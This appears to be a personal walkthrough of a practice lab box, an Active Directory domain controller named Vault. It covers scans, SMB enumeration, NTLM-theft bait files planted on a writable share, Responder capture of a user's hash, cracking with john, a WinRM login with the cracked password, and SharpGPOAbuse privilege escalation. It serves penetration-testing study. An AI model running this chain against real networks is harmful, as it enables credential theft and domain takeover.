practice test using these machines:
This one
[Linux Levram](Linux%20Levram.md)
[Linux Extplorer](Linux%20Extplorer.md)
[Windows Internal - box is broken](Windows%20Internal%20-%20box%20is%20broken.md)
# nmap
```
┌──(kali㉿kali)-[~/PG/vault-ad]
└─$ nmap -p- --min-rate 10000 192.168.165.172    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 22:26 EST
Nmap scan report for 192.168.165.172
Host is up (0.050s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49703/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds
                                                                                                                                                    
┌──(kali㉿kali)-[~/PG/vault-ad]
└─$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -sCV 192.168.165.172 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 22:28 EST
Nmap scan report for 192.168.165.172
Host is up (0.040s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-21 03:28:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                          
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)                        
445/tcp  open  microsoft-ds?                                                                                                                        
464/tcp  open  kpasswd5?                                                                                                                            
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                    
636/tcp  open  tcpwrapped                                                                                                                           
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)                        
3269/tcp open  tcpwrapped                                                                                                                           
3389/tcp open  ms-wbt-server Microsoft Terminal Services                                                                                            
| rdp-ntlm-info:                                                                                                                                    
|   Target_Name: VAULT                                                                                                                              
|   NetBIOS_Domain_Name: VAULT                                                                                                                      
|   NetBIOS_Computer_Name: DC                                                                                                                       
|   DNS_Domain_Name: vault.offsec                                                                                                                   
|   DNS_Computer_Name: DC.vault.offsec                                                                                                              
|   DNS_Tree_Name: vault.offsec                                                                                                                     
|   Product_Version: 10.0.17763                                                                                                                     
|_  System_Time: 2025-02-21T03:28:14+00:00                                                                                                          
|_ssl-date: 2025-02-21T03:28:54+00:00; 0s from scanner time.                                                                                        
| ssl-cert: Subject: commonName=DC.vault.offsec                                                                                                     
| Not valid before: 2025-02-20T03:26:08                                                                                                             
|_Not valid after:  2025-08-22T03:26:08                                                                                                             
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                         
|_http-title: Not Found                                                                                                                             
9389/tcp open  mc-nmf        .NET Message Framing                                                                                                   
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                  
                                                                                                                                                    
Host script results:                                                                                                                                
| smb2-time: 
|   date: 2025-02-21T03:28:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.99 seconds
```
![Pasted image 20250221112922](<0. Attachments/Pasted image 20250221112922.png>)

# SMB Enum
```
┌──(kali㉿kali)-[~/PG/vault-ad]
└─$ nxc smb 192.168.165.172 -u 'a' -p '' --shares
SMB         192.168.165.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.165.172 445    DC               [+] vault.offsec\a: (Guest)
SMB         192.168.165.172 445    DC               [*] Enumerated shares
SMB         192.168.165.172 445    DC               Share           Permissions     Remark
SMB         192.168.165.172 445    DC               -----           -----------     ------
SMB         192.168.165.172 445    DC               ADMIN$                          Remote Admin
SMB         192.168.165.172 445    DC               C$                              Default share
SMB         192.168.165.172 445    DC               DocumentsShare  READ,WRITE      
SMB         192.168.165.172 445    DC               IPC$            READ            Remote IPC
SMB         192.168.165.172 445    DC               NETLOGON                        Logon server share 
SMB         192.168.165.172 445    DC               SYSVOL                          Logon server share 
```
![Pasted image 20250221113543](<0. Attachments/Pasted image 20250221113543.png>)

empty but we can Write to DocumentShare share
![Pasted image 20250221113830](<0. Attachments/Pasted image 20250221113830.png>)

using --rid-brute
```
nxc smb 192.168.165.172 -u 'a' -p '' --rid-brute
```
![Pasted image 20250221115649](<0. Attachments/Pasted image 20250221115649.png>)

user - anirudh found

# Ntlm stealing

used ntlm_theft to create a .lnk file
![Pasted image 20250221121544](<0. Attachments/Pasted image 20250221121544.png>)
```
python3 /home/kali/Tools/ntlm_theft/ntlm_theft.py -g lnk -s 192.168.45.225 -f vault
```

going back to smb to put the file
![Pasted image 20250221123714](<0. Attachments/Pasted image 20250221123714.png>)
```
┌──(kali㉿kali)-[~/PG/vault-ad/vault]
└─$ smbclient //192.168.165.172/DocumentsShare -U 'a'
Password for [WORKGROUP\a]:
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> prompt
smb: \> mput vault*
putting file vault.m3u as \vault.m3u (0.4 kb/s) (average 0.4 kb/s)
putting file vault-(includepicture).docx as \vault-(includepicture).docx (79.2 kb/s) (average 40.8 kb/s)
putting file vault.asx as \vault.asx (1.2 kb/s) (average 27.3 kb/s)
putting file vault.rtf as \vault.rtf (0.9 kb/s) (average 21.0 kb/s)
putting file vault-(externalcell).xlsx as \vault-(externalcell).xlsx (47.3 kb/s) (average 26.2 kb/s)
putting file vault.pdf as \vault.pdf (6.3 kb/s) (average 22.9 kb/s)
putting file vault.jnlp as \vault.jnlp (1.6 kb/s) (average 20.0 kb/s)
putting file vault.lnk as \vault.lnk (18.1 kb/s) (average 19.7 kb/s)
putting file vault-(fulldocx).xml as \vault-(fulldocx).xml (329.7 kb/s) (average 76.2 kb/s)
putting file vault-(remotetemplate).docx as \vault-(remotetemplate).docx (188.8 kb/s) (average 87.8 kb/s)
putting file vault-(frameset).docx as \vault-(frameset).docx (83.9 kb/s) (average 87.5 kb/s)
putting file vault-(url).url as \vault-(url).url (0.5 kb/s) (average 80.7 kb/s)
putting file vault-(stylesheet).xml as \vault-(stylesheet).xml (1.3 kb/s) (average 74.9 kb/s)
putting file vault.application as \vault.application (11.6 kb/s) (average 70.1 kb/s)
putting file vault-(icon).url as \vault-(icon).url (0.7 kb/s) (average 64.7 kb/s)
putting file vault.wax as \vault.wax (0.5 kb/s) (average 60.9 kb/s)
putting file vault.htm as \vault.htm (0.7 kb/s) (average 57.7 kb/s)
putting file vault.scf as \vault.scf (0.7 kb/s) (average 54.6 kb/s)
smb: \> exit
```

using responder we get
```
┌──(kali㉿kali)-[~/PG/vault-ad]
└─$ sudo responder -I tun0 -vvv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.45.225]
    Responder IPv6             [fe80::f050:cfbd:4d23:9996]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-2RTKRHIPWYH]
    Responder Domain Name      [W3QW.LOCAL]
    Responder DCE-RPC Port     [45033]

[+] Listening for events...                                                                                                                         

[SMB] NTLMv2-SSP Client   : 192.168.165.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:824029abb214873e:84648FF64A1558098B311B2090B9C427:010100000000000080211BE4EE83DB01301B803FC363FEA70000000002000800570033005100570001001E00570049004E002D003200520054004B00520048004900500057005900480004003400570049004E002D003200520054004B0052004800490050005700590048002E0057003300510057002E004C004F00430041004C000300140057003300510057002E004C004F00430041004C000500140057003300510057002E004C004F00430041004C000700080080211BE4EE83DB01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320035000000000000000000
```
![Pasted image 20250221123829](<0. Attachments/Pasted image 20250221123829.png>)

# Hash Cracking
![Pasted image 20250221123946](<0. Attachments/Pasted image 20250221123946.png>)
using john
```
john anirudh.ntlm --wordlist=/home/kali/rockyou.txt
```
![Pasted image 20250221124037](<0. Attachments/Pasted image 20250221124037.png>)

# initial access 
![Pasted image 20250221134036](<0. Attachments/Pasted image 20250221134036.png>)
```
evil-winrm -i 192.168.165.172 -u anirudh -p SecureHM
```

# Local.txt
![Pasted image 20250221134141](<0. Attachments/Pasted image 20250221134141.png>)

# Priv esc enum
![Pasted image 20250221134305](<0. Attachments/Pasted image 20250221134305.png>)

interesting [GitHub - xct/SeRestoreAbuse: SeRestorePrivilege to SYSTEM](https://github.com/xct/SeRestoreAbuse)

also
![Pasted image 20250221141021](<0. Attachments/Pasted image 20250221141021.png>)

# priv esc

https://github.com/byronkg/SharpGPOAbuse

![Pasted image 20250221141752](<0. Attachments/Pasted image 20250221141752.png>)

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
```
![Pasted image 20250221141812](<0. Attachments/Pasted image 20250221141812.png>)

```
gpupdate /force
```
![Pasted image 20250221141859](<0. Attachments/Pasted image 20250221141859.png>)

verify we are admin
![Pasted image 20250221141931](<0. Attachments/Pasted image 20250221141931.png>)

![Pasted image 20250221141946](<0. Attachments/Pasted image 20250221141946.png>)

